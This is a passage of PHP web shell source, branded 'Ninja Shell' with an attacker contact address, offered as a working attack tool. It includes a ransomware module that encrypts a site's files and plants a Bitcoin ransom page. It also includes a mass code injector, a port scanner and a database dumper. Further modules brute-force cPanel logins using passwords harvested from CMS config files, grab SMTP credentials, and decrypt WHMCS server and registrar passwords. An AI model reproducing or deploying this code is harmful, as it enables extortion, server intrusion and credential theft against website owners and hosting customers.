I9J3doaXRlJz4NCgkJTWFueSBvZiB5b3VyIC5waHAsIC5jc3MsIC5qcywgYW5kIG90aGVyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJlbA0KCQliZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gPGJyPk1heWJlIHlvdSBhcmUgYnVzeSBsb29raW5nIGZvciBhIHdheSB0byANCgkJcmVjb3ZlciB5b3VyIGZpbGVzLDxicj4gYnV0IGRvIG5vdCB3YXN0ZSB5b3VyIHRpbWUhPGJyPiBOb2JvZHkgY2FuIGRlY3J5cHQgeW91ciBmaWxlcw0KCQl3aXRob3V0IG91ciBzcGVjaWFsIGRlY3J5cHRpb24gc2VydmljZS4gPGJyPg0KDQoJCTxmb250IENvbG9yID0gJ3JlZCc+RG8gTm90IFRyeSBUbyBEZWNyeXB0IEJ5IFlvdXIgU2VsZiwgT3IgWW91ciBGaWxlcyBXaWxsIEJlIERlbGV0ZWQgQXV0b21hdGljYWxseS4gPGJyPjxicj4NCgkJCTxmb250IGNvbG9yID0nd2hpdGUnIHNpemU9IjYiPiBIb3cgdG8gcmVjb3ZlciB5b3VyIHdlYnNpdGU/IDxicj48Zm9udCBzaXplID0gJzUnPg0KCQkJU3VyZSwgd2UgZ3VhcmFudGVlIHRoYXQgeW91IGNhbiByZWNvdmVyIGFsbCB5b3VyIGZpbGVzIHNhZmVseSBhbmQgZWFzaWx5LiBCdXQgeW91IGhhdmUgbm90IGVub3VnaCB0aW1lLjxicj4NCgkJCXdlIGNhbiBkZWNyeXB0IGFsbCB5b3VyIHdlYnNpdGUgZmlsZSBzYWZlbHksIGhvdyA/IFlvdSBNdXN0IFBheSBpdCB3aXRoPGZvbnQgY29sb3I9InJlZCI+IDEyMCRCaXRjb2luPC9mb250Pjxicj4NCgkJCUlmIHlvdSBuZWVkIG91ciBhc3Npc3RhbmNlLCBZb3UgY2FuIGNvbnRhY3QgdXMgdmlhIGVtYWlsOi1bRXhvcmNpc200MDRAaGFja2VybWFpbC5jb21dLSA8YnI+PGJyPg0KCQkJQWZ0ZXIgWW91IFBheSBpdC4gV2UgV2lsbCBEZWNyeXB0IFRoZSBFbmNyeXB0ZWQgRmlsZXMgSW4gWW91ciBXZWJzaXRlLg0KCQk8L2ZvbnQ+DQoJCTxicj4NCgkJPGJyPg0KDQoNCg0KDQoNCjwvY2VudGVyPg0KPC9ib2R5Pg0KDQoNCjwvaHRtbD4="))) {
									echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  virus.php (Default Page)<br>';
								}
							}
						}
						public function shcpackUnstall()
						{
							if (file_exists(".htaencrypted")) {
								if (unlink(".htaccess") && unlink("virus.php")) {
									echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
									echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> virus.php (Default Page)<br>';
								}
								rename(".htaencrypted", ".htaccess");
							}
						}
						public function plus()
						{
							flush();
							ob_flush();
						}
						public function locate()
						{
							return getcwd();
						}
						public function shcdirs($dir, $method, $key)
						{
							switch ($method) {
								case '1':
									deRanSomeware::shcpackInstall();
									break;
								case '2':
									deRanSomeware::shcpackUnstall();
									break;
							}
							foreach (scandir($dir) as $d) {
								if ($d != '.' && $d != '..') {
									$locate = $dir . DIRECTORY_SEPARATOR . $d;
									if (!is_dir($locate)) {
										if (deRanSomeware::kecuali($locate, "idx.php")  && deRanSomeware::kecuali($locate, ".htaccess")  && deRanSomeware::kecuali($locate, "virus.php") &&  deRanSomeware::kecuali($locate, "index.php") && deRanSomeware::kecuali($locate, ".htaencrypted")) {
											switch ($method) {
												case '1':
													deRanSomeware::shcEnCry($key, $locate);
													deRanSomeware::shcEnDesDirS($locate, "1");
													break;
												case '2':
													deRanSomeware::shcDeCry($key, $locate);
													deRanSomeware::shcEnDesDirS($locate, "2");
													break;
											}
										}
									} else {
										deRanSomeware::shcdirs($locate, $method, $key);
									}
								}
								deRanSomeware::plus();
							}
						}

						public function shcEnDesDirS($locate, $method)
						{
							switch ($method) {
								case '1':
									rename($locate, $locate . ".Exorcised");
									break;
								case '2':
									$locates = str_replace(".Exorcised", "", $locate);
									rename($locate, $locates);
									break;
							}
						}
						public function shcEnCry($key, $locate)
						{
							$data = file_get_contents($locate);
							$iv = mcrypt_create_iv(
								mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
								MCRYPT_DEV_URANDOM
							);
							$encrypted = base64_encode(
								$iv .
									mcrypt_encrypt(
										MCRYPT_RIJNDAEL_128,
										hash('sha256', $key, true),
										$data,
										MCRYPT_MODE_CBC,
										$iv
									)
							);
							if (file_put_contents($locate,  $encrypted)) {
								echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
							} else {
								echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> ' . $locate . ' <br>';
							}
						}
						public function shcDeCry($key, $locate)
						{
							$data = base64_decode(file_get_contents($locate));
							$iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
							$decrypted = rtrim(
								mcrypt_decrypt(
									MCRYPT_RIJNDAEL_128,
									hash('sha256', $key, true),
									substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
									MCRYPT_MODE_CBC,
									$iv
								),
								"\0"
							);
							if (file_put_contents($locate,  $decrypted)) {
								echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
							} else {
								echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
							}
						}
						public function kecuali($ext, $name)
						{
							$re = "/({$name})/";
							preg_match($re, $ext, $matches);
							if ($matches[1]) {
								return false;
							}
							return true;
						}
					}
					if ($_POST['submit']) {
						switch ($_POST['method']) {
							case '1':
								deRanSomeware::shcdirs(deRanSomeware::locate(), "1", $_POST['key']);
								break;
							case '2':
								deRanSomeware::shcdirs(deRanSomeware::locate(), "2", $_POST['key']);
								break;
						}
					} else {
					?>
						<div class="item">
							<center>
								<pre>
<font color = "lime"><i>
  ______                         _                  _______      ___   _                 _____                                                                
 |  ____|                       (_)                |__   __|    / _ \ (_)               |  __ \                                                               
 | |__   __  __ ___   _ __  ___  _  ___  _ __ ___     | | _ __ | | | | _   __ _  _ __   | |__) | __ _  _ __   ___   ___   _ __ ___ __      __ __ _  _ __  ___ 
 |  __|  \ \/ // _ \ | '__|/ __|| |/ __|| '_ ` _ \    | || '__|| | | || | / _` || '_ \  |  _  / / _` || '_ \ / __| / _ \ | '_ ` _ \\ \ /\ / // _` || '__|/ _ \
 | |____  >  <| (_) || |  | (__ | |\__ \| | | | |     | || |   | |_| || || (_| || | | | | | \ \| (_| || | | |\__ \| (_) || | | | | |\ V  V /| (_| || |  |  __/
 |______|/_/\_\\___/ |_|   \___||_||___/|_| |_| |_|   |_||_|    \___/ | | \__,_||_| |_| |_|  \_\\__,_||_| |_||___/ \___/ |_| |_| |_| \_/\_/  \__,_||_|   \___|
                                                                      / |                                                                                     
                                                                    |__/                                                                                      
</i>
               .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
         )b.  .dbo.dP'`v'`9b.odb.  .dX(
       ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
      dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
      dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
      9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
       `'      9XXXXXX(   )XXXXXXP      `'
	XXXX X.`v'.X XXXX
         XP^X'`b   d'`X^XX
         X. 9  `   '  P )X
         `b  `       '  d'
         `             '
		 
	 
 -[ Contact : Exorcism404@hackermail.com ]-
 
 System :  <?php echo php_uname() . "\n"; ?>
 Server : <?php $_SERVER['HTTP_HOST'] . "\n"; ?>
 #Ransomware Ini Berada Pada [dir]: <?php echo
										getcwd(); ?>/<?php $current_file_name =
															basename($_SERVER['PHP_SELF']);
														echo
															$current_file_name . "\n"; ?>
 </font>	
</pre>

								<h2>
									<font color='red' face='iceland'> Put Your Encryption/Decryption Key Here
								</h2>
								</font>

								<form action="" method="post" style=" text-align: center;">
									<input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC"><br><br>
									<h2>
										<font color='lime' face='iceland'> Post Type :
									</h2>
									</font>
									<select name="method" class="selecte">
										<option value="1">Encrypt Files!</option>
										<option value="2">Decrypt Files!</option>
									</select><br><br><br><br><br>
									<input type="submit" name="submit" class="submite" value="Execute Virus!" />
								</form>

							<?php
						} ?>
							</center>
						</div>
				</body>

				</html>
				<br>
				<hr>
			<?php

		} elseif (isset($_GET[hex('whois')])) {

			$dir = path();
			?>
				<form method="post">
					<?php
					@set_time_limit(0);
					@error_reporting(0);
					function sws_domain_info($site)
					{
						$getip = @file_get_contents("http://networktools.nl/whois/$site");
						flush();
						$ip = @findit($getip, '<pre>', '</pre>');
						return $ip;
						flush();
					}
					function sws_net_info($site)
					{
						$getip = @file_get_contents("http://networktools.nl/asinfo/$site");
						$ip = @findit($getip, '<pre>', '</pre>');
						return $ip;
						flush();
					}
					function sws_site_ser($site)
					{
						$getip = @file_get_contents("http://networktools.nl/reverseip/$site");
						$ip = @findit($getip, '<pre>', '</pre>');
						return $ip;
						flush();
					}
					function sws_sup_dom($site)
					{
						$getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=" . $site . "&Search+subdomains=Find+subdomains");
						$ip = @findit($getip, '<strong>Nameservers found:</strong>', '<script type="text/javascript">');
						return $ip;
						flush();
					}
					function sws_port_scan($ip)
					{
						$list_post = array('80', '21', '22', '2082', '25', '53', '110', '443', '143');
						foreach ($list_post as $o_port) {
							$connect = @fsockopen($ip, $o_port, $errno, $errstr, 5);
							if ($connect) {
								echo " $ip : $o_port ??? <u style=\"color: white\">Open</u> <br /><br />";
								flush();
							}
						}
					}
					function findit($mytext, $starttag, $endtag)
					{
						$posLeft = @stripos($mytext, $starttag) + strlen($starttag);
						$posRight = @stripos($mytext, $endtag, $posLeft + 1);
						return @substr($mytext, $posLeft, $posRight - $posLeft);
						flush();
					}
					echo '<br><br><center>';
					echo '
    <br /><hr>
	<div class="mybox">
	<h2>Whois Ninja Shell</h2>
	<form method="post"><table class="tabnet">
    <tr><td>Site to scan </td><td>:</td><td>
    <input type="text" name="site" size="50" style="color:black;background-color:#FFF" class="form-control" value="site.com" /> &nbsp <input class="form-control" type="submit" style="color:black;background-color:#FFF" name="scan" value="Scan !" /></td></tr>
    </table></form></div><hr><br>';
					if (isset($_POST['scan'])) {
						$site = @htmlentities($_POST['site']);
						if (empty($site)) {
							die('<br /><br /> Not add IP .. !');
						}
						$ip_port = @gethostbyname($site);
						echo "
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";
						echo "" . sws_port_scan($ip_port) . " </pre></div> ";
						flush();
						echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class=\"ru\">
   <pre>" . sws_domain_info($site) . "</pre></div>";
						flush();
						echo "
   <div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class=\"ru\">
   <pre>" . sws_net_info($site) . "</pre> </div>";
						flush();
						echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>" . sws_sup_dom($site) . "</pre> </div>";
						flush();
						echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>" . sws_site_ser($site) . "</pre> </div>
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
						flush();
					}
					echo '</center>';
				} elseif (isset($_GET[hex('phpinfo')])) {

					echo "<hr><br><center>";
					echo "<h2>Server Php Info</h2>";
					echo phpinfo();
					echo "<hr><br></center>";
				} elseif (isset($_GET[hex('inject-code')])) {
					echo "<hr><br>";
					echo '<center><h2>Mass Code Injector Ninja Shell</h2></center>';

					if (stristr(php_uname(), "Windows")) {
						$DS = "\\";
					} else if (stristr(php_uname(), "Linux")) {
						$DS = '/';
					}
					function get_structure($path, $depth)
					{
						global $DS;
						$res = array();
						if (in_array(0, $depth)) {
							$res[] = $path;
						}
						if (in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
							$tmp1 = glob($path . $DS . '*', GLOB_ONLYDIR);
							if (in_array(1, $depth)) {
								$res = array_merge($res, $tmp1);
							}
						}
						if (in_array(2, $depth) or in_array(3, $depth)) {
							$tmp2 = array();
							foreach ($tmp1 as $t) {
								$tp2 = glob($t . $DS . '*', GLOB_ONLYDIR);
								$tmp2 = array_merge($tmp2, $tp2);
							}
							if (in_array(2, $depth)) {
								$res = array_merge($res, $tmp2);
							}
						}
						if (in_array(3, $depth)) {
							$tmp3 = array();
							foreach ($tmp2 as $t) {
								$tp3 = glob($t . $DS . '*', GLOB_ONLYDIR);
								$tmp3 = array_merge($tmp3, $tp3);
							}
							$res = array_merge($res, $tmp3);
						}
						return $res;
					}

					if (isset($_POST['submit']) && $_POST['submit'] == 'Inject') {
						$name = $_POST['name'] ? $_POST['name'] : '*';
						$type = $_POST['type'] ? $_POST['type'] : 'html';
						$path = $_POST['path'] ? $_POST['path'] : getcwd();
						$code = $_POST['code'] ? $_POST['code'] : 'Pakistan Haxors Crew';
						$mode = $_POST['mode'] ? $_POST['mode'] : 'a';
						$depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
						$dt = get_structure($path, $depth);
						foreach ($dt as $d) {
							if ($mode == 'a') {
								if (file_put_contents($d . $DS . $name . '.' . $type, $code, FILE_APPEND)) {
									echo '<div><strong>' . $d . $DS . $name . '.' . $type . '</strong><span style="color:lime;"> was injected</span></div>';
								} else {
									echo '<div><span style="color:red;">failed to inject</span> <strong>' . $d . $DS . $name . '.' . $type . '</strong></div>';
								}
							} else {
								if (file_put_contents($d . $DS . $name . '.' . $type, $code)) {
									echo '<div><strong>' . $d . $DS . $name . '.' . $type . '</strong><span style="color:lime;"> was injected</span></div>';
								} else {
									echo '<div><span style="color:red;">failed to inject</span> <strong>' . $d . $DS . $name . '.' . $type . '</strong></div>';
								}
							}
						}
					} else {
						echo '<form method="post" action="">
        <center>
                <table align="center">
                    <tr><br>
                        <td>Directory : </td>
                        <td><input class = "form-control" type = "text" class="box" name="path" value="' . getcwd() . '" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select class = "form-control" style="width: 150px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td><br>
                            <input class = "form-control" type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                         
                            <select class = "form-control" style="width: 150px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea class = "form-control" name="code" style= "width:100%"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
                            <input class = "form-control" style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    <br></tr>
                </table>
        </form>';
					}
					echo "<hr><br>";
				} elseif (isset($_GET[hex('db-dump')])) {
					echo '
<center><hr><br>
<form action method=post>
<table width=371 class=tabnet >
<h2>Database Dumper Ninja Shell</h2>
<tr>
	<td>Server </td>
	<td><input class="form-control" type=text name=server size=52 autocomplete = "off"></td></tr><tr>
	<td>Username</td>
	<td><input class="form-control" type=text name=username size=52 autocomplete = "off"></td></tr><tr>
	<td>Password</td>
	<td><input class="form-control" type=text name=password size=52 autocomplete = "off"></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="form-control" type=text name=dbname size=52 autocomplete = "off"></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="' . $me . '">
	<select class="form-control" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
		<br>
	<input class="form-control" type=submit value="  Dump!  " ></td></tr>
	</form></center></table></div><hr><br>';
					if ($_POST['username'] && $_POST['dbname'] && $_POST['method']) {
						$date = date("Y-m-d");
						$dbserver = $_POST['server'];
						$dbuser = $_POST['username'];
						$dbpass = $_POST['password'];
						$dbname = $_POST['dbname'];
						$file = "Dump-$dbname-$date";
						$method = $_POST['method'];
						if ($method == 'sql') {
							$file = "Dump-$dbname-$date.sql";
							$fp = fopen($file, "w");
						} else {
							$file = "Dump-$dbname-$date.sql.gz";
							$fp = gzopen($file, "w");
						}
						function write($data)
						{
							global $fp;
							if ($_POST['method'] == 'ssql') {
								fwrite($fp, $data);
							} else {
								gzwrite($fp, $data);
							}
						}
						mysql_connect($dbserver, $dbuser, $dbpass);
						mysql_select_db($dbname);
						$tables = mysql_query("SHOW TABLES");
						while ($i = mysql_fetch_array($tables)) {
							$i = $i['Tables_in_' . $dbname];
							$create = mysql_fetch_array(mysql_query("SHOW CREATE TABLE " . $i));
							write($create['Create Table'] . ";nn");
							$sql = mysql_query("SELECT * FROM " . $i);
							if (mysql_num_rows($sql)) {
								while ($row = mysql_fetch_row($sql)) {
									foreach ($row as $j => $k) {
										$row[$j] = "'" . mysql_escape_string($k) . "'";
									}
									write("INSERT INTO $i VALUES(" . implode(",", $row) . ");n");
								}
							}
						}
						if ($method == 'ssql') {
							fclose($fp);
						} else {
							gzclose($fp);
						}
						header("Content-Disposition: attachment; filename=" . $file);
						header("Content-Type: application/download");
						header("Content-Length: " . filesize($file));
						flush();

						$fp = fopen($file, "r");
						while (!feof($fp)) {
							echo fread($fp, 65536);
							flush();
						}
						fclose($fp);
					}
				} elseif (isset($_GET[hex('cp-crack')])) {

					if ($_POST['crack']) {
						$usercp = explode("\r\n", $_POST['user_cp']);
						$passcp = explode("\r\n", $_POST['pass_cp']);
						$i = 0;
						foreach ($usercp as $ucp) {
							foreach ($passcp as $pcp) {
								if (@mysql_connect('localhost', $ucp, $pcp)) {
									if ($_SESSION[$ucp] && $_SESSION[$pcp]) {
									} else {
										$_SESSION[$ucp] = "1";
										$_SESSION[$pcp] = "1";
										if ($ucp == '' || $pcp == '') {
										} else {
											$i++;
											if (function_exists('posix_getpwuid')) {
												$domain_cp = file_get_contents("/etc/named.conf");
												if ($domain_cp == '') {
													$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
												} else {
													preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
													foreach ($domains_cp[1] as $dj) {
														$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
														$user_cp_url = $user_cp_url['name'];
														if ($user_cp_url == $ucp) {
															$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
															break;
														}
													}
												}
											} else {
												$dom = "<font color=red>function is Disable by system</font>";
											}
											echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
										}
									}
								}
							}
						}
						if ($i == 0) {
						} else {
							echo "<br>sukses nyolong " . $i . " Cpanel by <font color=lime>Exc Shell.</font>";
						}
					} else {
						echo "<center><hr><br>
		<form method='post'>
		<h2>Cpanel Crack Ninja Shell</h2>
		USER: <br>
		<textarea class = 'form-control' style='width: 450px; height: 150px;' name='user_cp'>";
						$_usercp = fopen("/etc/passwd", "r");
						while ($getu = fgets($_usercp)) {
							if ($getu == '' || !$_usercp) {
								echo "<font color=red>Can't read /etc/passwd</font>";
							} else {
								preg_match_all("/(.*?):x:/", $getu, $u);
								foreach ($u[1] as $user_cp) {
									if (is_dir("/home/$user_cp/public_html")) {
										echo "$user_cp\n";
									}
								}
							}
						}
						echo "</textarea><br>
		PASS: <br>
		<textarea class= 'form-control' style='width: 450px; height: 200px;' name='pass_cp'>";
						function cp_pass($dir)
						{
							$pass = "";
							$dira = scandir($dir);
							foreach ($dira as $dirb) {
								if (!is_file("$dir/$dirb")) continue;
								$ambil = file_get_contents("$dir/$dirb");
								if (preg_match("/WordPress/", $ambil)) {
									$pass .= ambilkata($ambil, "DB_PASSWORD', '", "'") . "\n";
								} elseif (preg_match("/JConfig|joomla/", $ambil)) {
									$pass .= ambilkata($ambil, "password = '", "'") . "\n";
								} elseif (preg_match("/Magento|Mage_Core/", $ambil)) {
									$pass .= ambilkata($ambil, "<password><![CDATA[", "]]></password>") . "\n";
								} elseif (preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
									$pass .= ambilkata($ambil, 'password = "', '"') . "\n";
								} elseif (preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
									$pass .= ambilkata($ambil, "'DB_PASSWORD', '", "'") . "\n";
								} elseif (preg_match("/client/", $ambil)) {
									preg_match("/password=(.*)/", $ambil, $pass1);
									$pass .= $pass1[1] . "\n";
									if (preg_match('/"/', $pass1[1])) {
										$pass1[1] = str_replace('"', "", $pass1[1]);
										$pass .= $pass1[1] . "\n";
									}
								} elseif (preg_match("/cc_encryption_hash/", $ambil)) {
									$pass .= ambilkata($ambil, "db_password = '", "'") . "\n";
								}
							}
							echo $pass;
						}
						$cp_pass = cp_pass($dir);
						echo $cp_pass;
						echo "</textarea><br>
		<input class = 'form-control' type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form><br>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center><hr><br>";
					}
				} elseif (isset($_GET[hex('smtp-grab')])) {
					$dir = path();
					echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
					function scj($dir)
					{
						$dira = scandir($dir);
						foreach ($dira as $dirb) {
							if (!is_file("$dir/$dirb")) continue;
							$ambil = file_get_contents("$dir/$dirb");
							$ambil = str_replace("$", "", $ambil);
							if (preg_match("/JConfig|joomla/", $ambil)) {
								$smtp_host = ambilkata($ambil, "smtphost = '", "'");
								$smtp_auth = ambilkata($ambil, "smtpauth = '", "'");
								$smtp_user = ambilkata($ambil, "smtpuser = '", "'");
								$smtp_pass = ambilkata($ambil, "smtppass = '", "'");
								$smtp_port = ambilkata($ambil, "smtpport = '", "'");
								$smtp_secure = ambilkata($ambil, "smtpsecure = '", "'");
								echo "<center>";
								echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
								echo "SMTP port: <font color=lime>$smtp_port</font><br>";
								echo "SMTP user: <font color=lime>$smtp_user</font><br>";
								echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
								echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
								echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
								echo "</center>";
							}
						}
					}
					$smpt_hunter = scj($dir);
					echo $smpt_hunter;
				} elseif (isset($_GET[hex('domains')])) {

					echo "<center>
		<div class='mybox'>
		<p align='center' class='cgx2'>Domains and Users</p>";
					$d0mains = @file("/etc/named.conf");
					if (!$d0mains) {
						die("<center>Error : can't read [ /etc/named.conf ]</center>");
					}
					echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';
					foreach ($d0mains as $d0main) {
						if (eregi("zone", $d0main)) {
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if (strlen(trim($domains[1][0])) > 2) {
								$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
								echo "<tr><td><a href=http://www." . $domains[1][0] . "/>" . $domains[1][0] . "</a></td><td>" . $user['name'] . "</td></tr>";
								flush();
							}
						}
					}
					echo '</div></center>';
				} elseif (isset($_GET[hex('whmcs-decoder')])) {

					echo '<form action="" method="post">';

					function decrypt($string, $cc_encryption_hash)
					{
						$key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
						$hash_key = _hash($key);
						$hash_length = strlen($hash_key);
						$string = base64_decode($string);
						$tmp_iv = substr($string, 0, $hash_length);
						$string = substr($string, $hash_length, strlen($string) - $hash_length);
						$iv = $out = '';
						$c = 0;
						while ($c < $hash_length) {
							$iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
							++$c;
						}
						$key = $iv;
						$c = 0;
						while ($c < strlen($string)) {
							if (($c != 0 and $c % $hash_length == 0)) {
								$key = _hash($key . substr($out, $c - $hash_length, $hash_length));
							}
							$out .= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
							++$c;
						}
						return $out;
					}

					function _hash($string)
					{
						if (function_exists('sha1')) {
							$hash = sha1($string);
						} else {
							$hash = md5($string);
						}
						$out = '';
						$c = 0;
						while ($c < strlen($hash)) {
							$out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
							$c += 2;
						}
						return $out;
					}

					echo "
<hr><br>
<br><center><h2>Whmcs Decoder Ninja Shell</h2></center>

<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr>
<tr><td>db_host </td><td><input  type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#000;background-color:' type='text' class='form-control' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='form-control' type='submit' style='color:#000;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
<hr><br>
";

					if ($_POST['form_action'] == 2) {
						//include($file);
						$db_host = ($_POST['db_host']);
						$db_username = ($_POST['db_username']);
						$db_password = ($_POST['db_password']);
						$db_name = ($_POST['db_name']);
						$cc_encryption_hash = ($_POST['cc_encryption_hash']);



						$link = mysql_connect($db_host, $db_username, $db_password);
						mysql_select_db($db_name, $link);
						$query = mysql_query("SELECT * FROM tblservers");
						while ($v = mysql_fetch_array($query)) {
							$ipaddress = $v['ipaddress'];
							$username = $v['username'];
							$type = $v['type'];
							$active = $v['active'];
							$hostname = $v['hostname'];
							echo ("<center><table border='1'>");
							$password = decrypt($v['password'], $cc_encryption_hash);
							echo ("<tr><td>Type</td><td>$type</td></tr>");
							echo ("<tr><td>Active</td><td>$active</td></tr>");
							echo ("<tr><td>Hostname</td><td>$hostname</td></tr>");
							echo ("<tr><td>Ip</td><td>$ipaddress</td></tr>");
							echo ("<tr><td>Username</td><td>$username</td></tr>");
							echo ("<tr><td>Password</td><td>$password</td></tr>");

							echo "</table><br><br></center>";
						}

						$link = mysql_connect($db_host, $db_username, $db_password);
						mysql_select_db($db_name, $link);
						$query = mysql_query("SELECT * FROM tblregistrars");
						echo ("<center>Domain Reseller <br><table class=tabnet border='1'>");
						echo ("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
						while ($v = mysql_fetch_array($query)) {
							$registrar     = $v['registrar'];
							$setting = $v['setting'];
							$value = decrypt($v['value'], $cc_encryption_hash);
							if ($value == "") {
								$value = 0;
							}
							$password = decrypt($v['password'], $cc_encryption_hash);
							echo ("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
						}
					}
				} elseif (isset($_GET[hex('delete-logs')])) {

